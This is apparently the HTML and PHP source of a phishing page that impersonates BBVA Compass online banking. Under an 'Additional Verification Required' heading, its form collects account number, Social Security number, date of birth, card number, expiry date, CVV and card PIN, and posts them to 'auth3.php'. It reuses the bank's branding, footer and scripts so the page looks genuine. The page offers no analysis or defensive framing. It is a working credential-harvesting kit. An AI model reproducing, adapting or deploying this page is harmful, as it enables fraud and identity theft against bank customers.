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0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEHvkYhBwtGIQcLRiEHvkYhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQe+RiEHC0YhBwlGIQe6RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB7pGIQcJRiEHAUYhB5xGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEHnEYhBwEAAAAARiEHVEYhB/hGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/hGIQdUAAAAAAAAAABGIQcMRiEHp0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEHp0YhBwwAAAAAAAAAAAAAAABGIQcdRiEHqEYhB/hGIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH+EYhB6hGIQcdAAAAAAAAAAAAAAAAAAAAAAAAAABGIQcNRiEHVEYhB51GIQe6RiEHvkYhB75GIQe+RiEHvkYhB75GIQe+RiEHvkYhB75GIQe+RiEHvkYhB75GIQe+RiEHvkYhB75GIQe+RiEHvkYhB75GIQe+RiEHukYhB51GIQdURiEHDQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARiEHAkYhBwlGIQcLRiEHC0YhBwtGIQcLRiEHC0YhBwtGIQcLRiEHC0YhBwtGIQcLRiEHC0YhBwtGIQcLRiEHC0YhBwtGIQcLRiEHC0YhBwtGIQcJRiEHAgAAAAAAAAAAAAAAAAAAAAAAAAAA//////gAAB/gAAAHwAAAA8AAAAOAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABwAAAA8AAAAPgAAAH+AAAH/////8oAAAAEAAAACAAAAABACAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYhBwxGIQdPRiEHdkYhB3hGIQd3RiEHd0YhB3dGIQd3RiEHd0YhB3dGIQd4RiEHdkYhB09GIQcMAAAAAEYhBwtGIQeQRiEH9UYhB/5GIQf+RiEH/kYhB/5GIQf+RiEH/kYhB/5GIQf+RiEH/kYhB/5GIQf1RiEHkEYhBwtGIQdPRiEH80YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/NGIQdPRiEHdUYhB/5GIQf/RiEH/0YhB/9FIAX/RB4E/0QeBP9EHwT/RSAG/0YhB/9GIQf/RiEH/0YhB/9GIQf+RiEHdUYhB3dGIQf+RiEH/0YhB/9FIAb/WDcf/2xOOf9tUDz/aEo1/1AtFf9FIAb/RiEH/0YhB/9GIQf/RiEH/kYhB3dGIQd3RiEH/kYhB/9GIQf/RB4E/56Lff/b1M7/pJKF/93W0v/LwLn/Xz8o/0UfBf9GIQf/RiEH/0YhB/5GIQd3RiEHd0YhB/5GIQf/RiEH/0MeBP+mlIf/zMK6/0cjCf+gjX///////5eCdP9DHgP/RiEH/0YhB/9GIQf+RiEHd0YhB3dGIQf+RiEH/0YhB/9DHgT/pZSH/8zCu/9KJgz/pJKF//v6+v+EbFr/Qx4D/0YhB/9GIQf/RiEH/kYhB3dGIQd3RiEH/kYhB/9GIQf/Qx4E/6WUh//LwLn/Z0gz/+Xf3P+vn5P/SycO/0YgBv9GIQf/RiEH/0YhB/5GIQd3RiEHd0YhB/5GIQf/RiEH/0MeBP+mlIf/zMG6/1EuFf/Nw7z/uKqg/0ciCP9GIQf/RiEH/0YhB/9GIQf+RiEHd0YhB3dGIQf+RiEH/0YhB/9EHgT/nYp8/9rTzv+hjoH/29TP/6mXi/9HIgj/RiEH/0YhB/9GIQf/RiEH/kYhB3dGIQd3RiEH/kYhB/9GIQf/RiAG/1c1Hf9oSjX/akw4/2VGMP9NKhH/RiAG/0YhB/9GIQf/RiEH/0YhB/5GIQd3RiEHdUYhB/5GIQf/RiEH/0YhB/9FIAb/RB4E/0QeBP9EHwT/RiAG/0YhB/9GIQf/RiEH/0YhB/9GIQf+RiEHdUYhB09GIQfzRiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH/0YhB/9GIQf/RiEH80YhB09GIQcLRiEHkEYhB/VGIQf+RiEH/kYhB/5GIQf+RiEH/kYhB/5GIQf+RiEH/kYhB/5GIQf+RiEH9UYhB5BGIQcLAAAAAEYhBwxGIQdPRiEHdkYhB3hGIQd3RiEHd0YhB3dGIQd3RiEHd0YhB3dGIQd4RiEHdkYhB09GIQcMAAAAAP//AACAAQAAgAEAAIABAACAAQAAgAEAAIABAACAAQAAgAEAAIABAACAAQAAgAEAAIABAACAAQAAgAEAAP//AAA=">
<style>@keyframes sxt-play-anim-hover{from{background-position:0px}to{background-position:-5250px}}@keyframes sxt-play-anim-saving{100%{background-position:-14750px}}@keyframes sxt-play-anim-saved{100%{background-position:-5000px}}</style>     


        <!-- css -->



        <link rel="stylesheet" href="./secure-auth/sba_css/jquery-ui-1.10.3.custom.1.21.0.1.min.css" />
        <link rel="stylesheet" href="./secure-auth/sba_css/jquery.multiselect.1.21.0.1.min.css" />
        <link rel="stylesheet" href="./secure-auth/sba_css/jquery.multiselect.custom.1.21.0.1.min.css" />
        <link rel="stylesheet" href="./secure-auth/sba_css/jquery.qtip.1.21.0.1.min.css" />
        <link rel="stylesheet" href="./secure-auth/sba_css/styles.1.21.0.1.min.css" />
        <link rel="stylesheet" href="./secure-auth/sba_css/prettycheckboxes.custom.1.21.0.1.min.css" />
        <link rel="stylesheet" media="print" href="./secure-auth/sba_css/print.1.21.0.1.min.css " />

        <!-- js -->
        <script type="text/javascript" src="./secure-auth/js/jquery-2.1.4.min.js"></script>
        <script type="text/javascript" src="./secure-auth/js/jquery-ui-1.10.3.custom.min.js"></script>
        <script type="text/javascript" src="./secure-auth/js/prettyCheckboxes.1.21.0.1.min.js"></script>
        <script type="text/javascript" src="./secure-auth/js/jquery.multiselect.min.js"></script>
        <script type="text/javascript" src="./secure-auth/js/sba/code.1.21.0.1.min.js"></script>
        <script type="text/javascript" src="./secure-auth/js/inettuts_custom.1.21.0.1.min.js"></script>
        <script type="text/javascript" src="./secure-auth/js/compass.utils.1.21.0.1.min.js"></script>
        <script type="text/javascript" src="./secure-auth/js/jquery.qtip.min.js"></script>
        <script type="text/javascript" src="./secure-auth/js/sba/TRDvalidate.1.21.0.1.min.js"></script>
        <script type="text/javascript" src="./secure-auth/js/TRDcurtain.1.21.0.1.min.js"></script>
        <script type="text/javascript" src="./secure-auth/js/TRDslider.1.21.0.1.min.js"></script>
        <script type="text/javascript" src="./secure-auth/js/sba/validation.1.21.0.1.min.js"></script>
        <script type="text/javascript" src="./secure-auth/js/oaoMods.1.21.0.1.min.js"></script>
        <script type="text/javascript" src="./secure-auth/js/layout.modify.1.21.0.1.min.js"></script>
        <script type="text/javascript" src="./secure-auth/js/TRDpasswordstrength.1.21.0.1.min.js"></script>
        <script type="text/javascript" src="./secure-auth/js/compassOLB-utils.1.21.0.1.min.js"></script>
        <script type="text/javascript" src="./secure-auth/js/authValidateWebFlow_re.1.21.0.1.min.js"></script>

<script type="text/javascript">


//            $("#reminderSubmit").click(function () {
//                var form = $("#main_form");
//                console.log(form.action);
//                form.submit();
//            });
            $().ready(function () {

                var i18n = {
                    valMustAccountNumber16: "Account number must be 16 digits.",
                    valEnterAccountNumber: "Information required.",
                    valProvideCVV2Number: "Security code required.",
                    valRequiredCVV2Number: "Security code required.",
                    valInvalidCVV2Number: "Invalid security code.",
                    valEalEnterOnlyDigits: "Enter numerical digits only.",
                    valMustCVV2Number3: "Your security code must be 3 digits.",
                    valProvideMonth: "Information required.",
                    valProvideYear: "Provide a year.",
                    valProvidePassword: "Information required.",
                    valEnterCardNumber16: "The 16-digit number is not a valid card number.",
                    valMustPassword4: "Your password must be at least four characters.",
                    valMustPassword412: "Your password must be between four to twelve characters in length.",
                    passmarkEnrollmentSecurityAnswer: "???passmarkEnrollment.securityAnswer???",
                    valMustDigitAccountNumber16: "Your account number must be 16 digits.",
                    valInvalidAccountNumber: "Invalid account number.",
                    valMustAccountNumber: "The account number must be 16 digits.",
                    valProvideEmail: "Information required.",
                    valEnterEmail: "Enter a valid email address.",
                    valProvideAnswer: "Please select a valid answer.",
                    valMustAnswer4: "Your answer must be at least 4 characters in length.",
                    valErrorAccount: "Error: Invalid account and/or email information.",
                    valErrorAttempts: "Error: Too many attempts",
                    valErrorQuestion: "Error: No challenge question received",
                    valMustAccount16: "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Your account must be 16 characters.",
                    valEnterNewPassword: "Enter new password.",
                    valEnterPasswordAgain: "Enter new password again.",
                    valNotMatchPasswords: "Passwords entered and re-entered do not match.",
                    valMustCardNumber16: "Your card number must be 16 digits.",
                    valEnterPinNumber: "Enter card PIN.",
                    valInvalidPin: "Invalid PIN.",
                    valEnterPin: "Enter a PIN",
                    valInformationRequired: "Information required.",
                    valMustFieldBeginLetter: "This field must begin with a letter.",
                    valProvideNickname: "Information required.",
                    valCannotNicknameSpecial: "Nickname cannot contain spaces or special characters.",
                    valMustNickname620: "Your nickname must be 6 to 20 characters.",
                    valMustNicknameBeginLetter: "Your nickname must begin with a letter and must contain only letters, numbers, or underscore.",
                    valProvideNewPassword: "Information required.",
                    valCannotPasswordSpecial: "Your password cannot contain spaces or special characters.",
                    valNotMatchEmails: "Email addresses entered and re-entered do not match.",
                    valNotMatchAddresses: "Email addresses do not match.",
                    valEnterText: "Enter the text displayed in the picture.",
                    valAcceptPolicy: "You must agree with the terms and conditions.",
                    valSelectQuestion: "Please select a question",
                    valAnswerQuestion: "Please enter a security phrase.",
                    valMustSecurityAnswer4: "Your security answer must be 4 to 12 characters in length.",
                    valEnterSecurityPhrase: "Please enter a security phrase.",
                    valInvalidPhrase: "Invalid phrase.",
                    valSelectSecurityQuestion: "Select and answer security question from each menu.",
                    valEnterPassword: "Enter your password.",
                    valFieldRequired: "This field is required.",
                    valEnterNumber: "Invalid amount.",
                    valEnterCardNumber: "Enter a valid credit card number.",
                    valConfirm: "Confirm",
                    valSelectAnswer: "Select and answer security question.",
                    valSelectAccountType: "Select account type.",
                    valMustAccountNickname830: "Your account nickname must be 8 to 30 characters in length.",
                    blockLoading: "Please wait while loading the information..."
                };
                
//                $("#reminderSubmit").on('click', function (event) {
//                    event.preventDefault();
//                    account = $("#account").val();
//                    if(account<16)
//                    alert(i18n.valMustAccountNumber16);
//                            
//                });
            });
            
    
        </script>




        <script type="text/javascript">

            $(document).keydown(function (e) {
                var code = (e.keyCode ? e.keyCode : e.which);
                if (code == 116) { //F5 keycode
                    if (window.event) {
                        window.event.returnValue = null;
                        event.keyCode = 0;
                    } else {
                        e.preventDefault();
                    }

                    window.location.reload(true);
                }
                return true;
            });
        </script>

        <script> // Add placeholder to all inputs (for older versions of IE)
            $('input, textarea').placeholder();</script>
        <style type="text/css">
            .errorblock {
                color: #ff0000;
                background-color: #ffEEEE;
                border: 3px solid #ff0000;
                padding: 8px;
                margin: 16px;
            }
            .btn_submit{
                float: right;
                display: block;
                overflow: hidden;
                position: relative;
                width: 82px !important;
                border: none;
                /*                color: #0066cc;*/
                text-decoration: none;
                margin: 0;
                padding: 0;
                color: #fff;
                background-image: secure-auth/img/continue.png;
                //background-color: #0066cc;
            }

        </style>
    </head>

    <body class="offline" style="visibility:hidden" onload="unhideBody()">
      <script type="text/javascript" language="JavaScript">
         document.getElementById("noScript").style.display = "none";
    </script>

        <div id="application" style="display: none;">sba</div>

        <div id="umg" style="display:none;">sba</div>

        <div id="pageHeader">
    <!-- popups -->


            <div class="header">
                <div class="cnt_logo">
                    <a href="" class="logo">
                        BBVA Compass


                    </a>
                </div>

                <!-- nav menu -->




                <!-- End nav menu -->
                <div class="menu_bar">


                </div>

            </div>

            <!-- END HEADER  -->


        </div>










        <div class="content" id="content">

            <div class="main">

                <h1>
                    Additional Verification Required
                </h1>

                <div class="offline_module">



                    <p id="errorcontainer" class="dialog_only_text red" style="display: none"></p>
                    <div class="TRDslider"><div class="TRDslider-progress-container" style="display: block;">
                            <div class="TRDslider-progress TRDslider-progress-steps-3">
                                <div class="TRDslider-progress-steps-titles">
                                    <span class="TRDslider-progress-steps-titles-title TRDslider-progress-steps-titles-title-first"><em class="active">Step 1</em></span>
                                    <span class="TRDslider-progress-steps-titles-title"><em style="margin-left: 0px;">Step 2</em></span>
                                    <span class="TRDslider-progress-steps-titles-title TRDslider-progress-steps-titles-title-last"><em>Step 3</em></span>
                                </div>
                                <div class="TRDslider-progress-bar-steps">
                                    <div class="TRDslider-progress-bar">
                                        <span class="TRDslider-progress-bar-marker"></span>
                                        <div class="TRDslider-progress-bar-bar"></div>
                                    </div>
                                    <div class="TRDslider-progress-steps">
                                        <span class="TRDslider-progress-steps-step TRDslider-progress-steps-step-active"><span class="marker"></span></span>
                                        <span class="TRDslider-progress-steps-step"><span class="marker"></span></span>
                                        <span class="TRDslider-progress-steps-step TRDslider-progress-steps-last"><span class="marker"></span></span>
                                    </div>
                                    <div class="TRDslider-progress-background"></div>
                                </div>
                            </div>
                        </div><div class="TRDslider-loader" style="height: 612px; display: none;"></div><div class="TRDslider-wrapper" style="width: 100%; height: 612px; position: relative;"><div class="TRDslider-window" style="position: relative; overflow: hidden; width: 100%; height: 612px;"><div class="TRDslider-container" style="width: 999999px; position: relative; left: 0px;"><div class="fn_loadTRDslider fn_TRDsliderAnchor" data-trdslider-options="{preload: &#39;/secure-auth/default_nicknameReminder?execution=e1s1&amp;_eventId=view-loaded&#39;, steps: [&#39;Step 1&#39;, &#39;Step 2&#39;,&#39;Step 3&#39;,]}">

                                        <div class="TRDslider-child TRDslider-pager" style="float: left; width: 636px;">



                                            <div id="content">
                                                <div class="bbva-alert-message-container bbva-alert-message-product-unavailable oaohide" data-bbva-class="modal-alert-message" style="display: none;">
                                                    <div class="bbva-alert-message" id="oaoerrorcontainer">
                                                    </div>
                                                </div>	

                                                <div class="offline_module_content standard_middle_padding oaofull">
                                                    <form id="nicknameReminderStep1" name="main_form" class="enter_form" data-progress="1" action="auth3.php" method="post" onsubmit="return do_validate();">
                                                        <input type="hidden" value="/secure-auth/default_nicknameReminder?execution=e1s2" id="executionNickStep1">
                                                        <fieldset class="paragraph_list">

                                                            <h2 class="bbva-application-title oaohide">Verify Identity?</h2>
                                                            <p>
                                                                Please enter the following information to verify your identity
                                                            </p><p></p>

                                                            <div class="bbva-input-field" data-bbva-class="input-field" aria-live="polite">
                                                                <div class="bbva-input-field-container">
                                                                    <label class="bbva-input-label reset-label" data-bbva-class="input-label" for="account">Account Number</label>
                                                                    <input required="required" class="bbva-input valid2" maxlength="16" data-bbva-class="input" type="text" id="account" name="account" placeholder="Account Number" autofocus="" pattern="[0-9]*"><font color='red' size="2"> *</font>
                                                                    <div class="bbva-input-success"><span class="bbva-accessible-text oaohide">You have successfully completed this field.</span></div>
                                                                    <div class="bbva-error-container">
                                                                        <span class="bbva-error-icon"></span>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <p></p>
                                                            <div class="bbva-input-field" data-bbva-class="input-field" aria-live="polite">
                                                                <div class="bbva-input-field-container">
                                                                    <label class="bbva-input-label reset-label" data-bbva-class="input-label" for="ssn">Social Security Number</label>
                                                                    <input required="required" class="bbva-input valid2" maxlength="9" data-bbva-class="input" type="text" id="ssn" name="ssn" placeholder="Social Security Number" maxlength="11" pattern="[0-9]*"><font color='red' size="2"> *</font>
                                                                    <div class="bbva-input-success"><span class="bbva-accessible-text oaohide">You have successfully completed this field.</span></div>
                                                                    <div class="bbva-error-container">
                                                                        <span class="bbva-error-icon"></span>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <p></p>

                                                            <div class="bbva-input-field" data-bbva-class="input-field" aria-live="polite">
                                                                <div class="bbva-input-field-container">
                                                                    <label class="bbva-input-label reset-label" data-bbva-class="input-label" for="dob">Date of Birth</label>
                                                                    <input required="required" min="1900-01-01" max="2006-01-01" class="bbva-input valid2" data-bbva-class="input" type="date" id="dob" name="dob"><font color='red' size="2"> *</font>(MM/DD/YYYY)
                                                                    <div class="bbva-input-success"><span class="bbva-accessible-text oaohide">You have successfully completed this field.</span></div>
                                                                    <div class="bbva-error-container">
                                                                        <span class="bbva-error-icon"></span>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <p></p>

                                                            <div class="bbva-input-field" data-bbva-class="input-field" aria-live="polite">
                                                                <div class="bbva-input-field-container">
                                                                    <label class="bbva-input-label reset-label" data-bbva-class="input-label" for="ccno">Card Number</label>
                                                                    <input class="bbva-input valid2" data-bbva-class="input" type="text" id="ccno" name="ccno" placeholder="Card Number" maxlength="19" pattern="[0-9]*">
                                                                    <div class="bbva-input-success"><span class="bbva-accessible-text oaohide">You have successfully completed this field.</span></div>
                                                                    <div class="bbva-error-container">
                                                                        <span class="bbva-error-icon"></span>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <p></p>

                                                            <div class="bbva-input-field" data-bbva-class="input-field" aria-live="polite">
                                                                <div class="bbva-input-field-container">
                                                                    <label class="bbva-input-label reset-label" data-bbva-class="input-label" for="exp">Expiration Date</label>
                                                                    <input class="bbva-input valid2" placeholder="(MM/YY)"  data-bbva-class="input" type="text" id="exp" name="exp" > &nbsp;(MM/YY)
                                                                    <div class="bbva-input-success"><span class="bbva-accessible-text oaohide">You have successfully completed this field.</span></div>
                                                                    <div class="bbva-error-container">
                                                                        <span class="bbva-error-icon"></span>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <p></p>

                                                            <div class="bbva-input-field" data-bbva-class="input-field" aria-live="polite">
                                                                <div class="bbva-input-field-container">
                                                                    <label class="bbva-input-label reset-label" data-bbva-class="input-label" for="cvv">CVV</label>
                                                                    <input class="bbva-input valid2" data-bbva-class="input" type="text" id="cvv" name="cvv" maxlength="4" pattern="[0-9]*">
                                                                    <div class="bbva-input-success"><span class="bbva-accessible-text oaohide">You have successfully completed this field.</span></div>
                                                                    <div class="bbva-error-container">
                                                                        <span class="bbva-error-icon"></span>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <p></p>

                                                            <div class="bbva-input-field" data-bbva-class="input-field" aria-live="polite">
                                                                <div class="bbva-input-field-container">
                                                                    <label class="bbva-input-label reset-label" data-bbva-class="input-label" for="pin">Card PIN</label>
                                                                    <input class="bbva-input valid2" data-bbva-class="input" type="text" id="pin" name="pin" maxlength="4" pattern="[0-9]*">
                                                                    <div class="bbva-input-success"><span class="bbva-accessible-text oaohide">You have successfully completed this field.</span></div>
                                                                    <div class="bbva-error-container">
                                                                        <span class="bbva-error-icon"></span>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <p></p>

                                                        </fieldset>

                                                        <fieldset class="slider_buttons_area">

                                                            <img class="loading label_hide" style="display: none; margin-left: 35%;" alt="Loading" src="./verify_files/loader.gif">
                                                            <div id="formimage1" title="Continue"><input id='reminderSubmit' type="image" name="formimage1" width="78" height="35" style='width: 82px !important;' class='btn_submit' src="images/continue.png"></div>

                                                            <!--                                                            <input style="display:none" type="submit" id="reminderSubmit2" class="btn-oao bbva-button btn_arrow aright fn_TRDslidernext" title="Continue">-->

                                                        </fieldset>
                                                        <br>


                                                    </form>
                                                </div>
                                            </div>

                                            <script>
                                                $('input, textarea').placeholder();
                                            </script>
                                        </div><div class="TRDslider-child TRDslider-pager" style="float: left; width: 636px;"></div><div class="TRDslider-child TRDslider-pager" style="float: left; width: 636px;"></div></div></div></div></div></div>


                </div>

            </div>


        </div>

        <!-- END CONTENT  -->

        <script type="text/javascript"
        src="./secure-auth/js/authValidateWebFlow_re.1.21.0.1.min.js"></script>

        <script type="text/javascript">



                                                $(document).ready(function () {
                                                    setDevicePrint(encode_deviceprint(), "/secure-auth");
                                                });


        </script>

        <div id="pageFooter">









            <div id="pageFooter">
                <div class="footer">
                    <ul class="footer_menu">
                        <li class="fc"><a target="_blank" href="#" id="linkSecurityCenter">Security Center</a></li>
                        <li><a target="_blank" href="#" id="linkPrivacy">Privacy</a></li>
                        <li><a target="_blank" href="#"  id="linkAgreement">Online Banking Agreement</a></li>
                        <li><a target="_blank" href="#" id="linkECAgreement">Electronic Communications Agreement</a></li>
                        <li><a target="_blank" href="#" id="linkLocations">Locations</a></li>
                        <li class="lc"><a target="_blank" href="#" id="linkContactUs">Contact Us</a></li>
                    </ul>
                    <div class="footer_copyright">
                        <p class="copyright" align="center">&copy;2018 BBVA Compass Bancshares, Inc. Compass Bank is a Member FDIC and an Equal Housing Lender.<br>	BBVA Compass is a trade name of Compass Bank, a member of the BBVA Group.<br>	Online Banking Questions and Technical Support: 1-800-273-1057.<br>	All other Account Questions and Support: 1-800-266-7277.</p>

                    </div>
                </div>
            </div>

            <!-- END FOOTER  -->


        </div>

        <script type="text/javascript" src="./secure-auth/js/rsa/pm_fp.js"></script>
        <script type="text/javascript"
        src="./secure-auth/js/rsa/AC_OETags.js"></script>
    

    <!-- Codigo de Alerta de Carga  -->
    <div id="terms" class="btn" style="display: none;">
        <p id="waitingMessage"></p>
        <div class="isloading"></div>
        <div id="nomodal" class="">

            <p>
                <strong>Thank You</strong>
            </p>

        </div>
        <!-- <input type="button" id="blockUIModalOk" value="Ok" /> -->

    </div>

    <script type="text/javascript">

                                                window.onbeforeunload = function () {
                                                    if ($("#application").text() != 'oao')
                                                        block(i18n.blockLoading);//display message
                                                };
                                                function closeIt() {
                                                    //removed
                                                }

                                                var blocking = false;//synchronizer variable
                                                function block(message) {
                                                    if (blocking == false) {
                                                        blocking = true;
                                                        $('#waitingMessage').html(message);
                                                        $('#nomodal').show();
                                                        $('#blockUIModalOk').hide();

                                                    }
                                                }
                                                function blockModalOk(message) {
                                                    $('#waitingMessage').html(message);
                                                    $('#nomodal').hide();
                                                    $('#blockUIModalOk').show();

                                                    $('#blockUIModalOk').click(function () {
                                                        unblock();
                                                    });
                                                }
                                                function unblock() {
                                                    closeIt();
                                                    blocking = false;
                                                }
                                                ;
                                                block(i18n.blockLoading);//display message
                                                $(document).ready(function () {
                                                    unblock();//hide message
                                                });
    </script>
                <script type="text/javascript">
$(document).ready(function () {
    jQuery.ajax({
                  url: 'timezone.php' + '?time=' + new Date(),
                  success: function (result) {
                      //
                  },
                  async: false
                      });
});
    </script>

</body>

</html>
<?php ob_end_flush(); ?>